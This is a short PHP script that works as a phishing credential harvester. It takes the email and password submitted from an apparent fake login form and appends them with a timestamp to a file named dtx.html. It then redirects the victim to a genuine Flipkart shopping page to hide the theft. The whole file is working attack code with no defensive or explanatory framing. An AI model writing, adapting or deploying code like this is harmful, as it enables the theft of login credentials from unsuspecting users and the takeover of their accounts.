<?php
date_default_timezone_set('Asia/Kolkata');
$username = $_POST['email'];
$password = $_POST['pass'];

if($username && $password){
	
	$myfile = fopen("dtx.html", "a") or die("Unable to open file!");
	fwrite($myfile, 'Username: '.$username.'<br/>');
	fwrite($myfile, 'Password: '.$password.'<br/>');
	fwrite($myfile, 'Time: '.date('d-m-y h:i A',time()).'<br/>');
	fclose($myfile);
	
	header('location:http://www.flipkart.com/beauty-and-personal-care/pr?p[]=facets.discount_range%255B%255D%3D25%2525%2B-%2B30%2525&p[]=facets.discount_range%255B%255D%3D30%2525%2B-%2B35%2525&p[]=facets.discount_range%255B%255D%3D35%2525%2B-%2B40%2525&p[]=facets.discount_range%255B%255D%3D40%2525%2B-%2B45%2525&p[]=facets.discount_range%255B%255D%3D45%2525%2B-%2B50%2525&p[]=facets.discount_range%255B%255D%3DMore%2Bthan%2B50%2525&p[]=facets.availability%255B%255D%3DExclude%2BOut%2Bof%2BStock&p[]=sort%3Dpopularity&sid=t06&filterNone=true&offer=nb%3Amp%3A10e3a4a614');
?>
}
